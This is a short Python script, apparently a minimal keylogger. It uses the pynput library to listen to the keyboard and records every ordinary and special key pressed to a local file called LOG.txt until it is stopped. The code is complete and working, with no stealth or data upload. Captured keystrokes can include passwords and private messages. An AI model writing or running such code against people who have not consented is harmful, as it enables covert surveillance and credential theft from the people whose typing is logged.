from pynput import keyboard
import logging

log_file = "LOG.txt"
logging.basicConfig(filename=log_file, level=logging.INFO)


def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
